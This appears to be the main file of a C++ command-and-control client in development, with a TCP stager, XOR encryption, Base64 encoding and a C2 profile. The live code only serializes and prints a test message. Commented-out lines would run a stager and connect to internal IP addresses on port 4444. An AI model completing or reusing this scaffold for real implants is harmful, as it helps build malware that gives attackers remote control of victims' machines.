#include "Client.h"
#include <iostream>

int main()
{
	//Config config = loadConfig();
    //Client client(config);
    //tcpStager.run("172.18.245.234", "4444");
    //tcpStager.run("10.0.0.86", "4444");
	//Client client;
	//
	//Compressor compressor; 
	XorEncryptor encryptor; 
	B64Encoder encoder;
	BinarySerializer serializer; 
	C2Profile config;

    //Client client(compressor, encryptor, encoder, serializer, config);
    Client client(encryptor, encoder, serializer, config);

	InternalMessage msg;
	std::vector<uint8_t> outMsg;

	serializer.serialize(msg, outMsg);

	for (auto b : outMsg)
	{
		std::cout << static_cast<int>(b) << " ";
	}
	std::cout << std::endl;


    //const char server_ip[] = "127.0.0.1";
    //client.run(server_ip, "4444"); // TODO: add/replace with C2Profile Config param?

	/* MainLoop: 
	 * - setup socket
	 * - connect to server
	 * - client main loop
	 * - close connection
	 * */
    return 0;
}
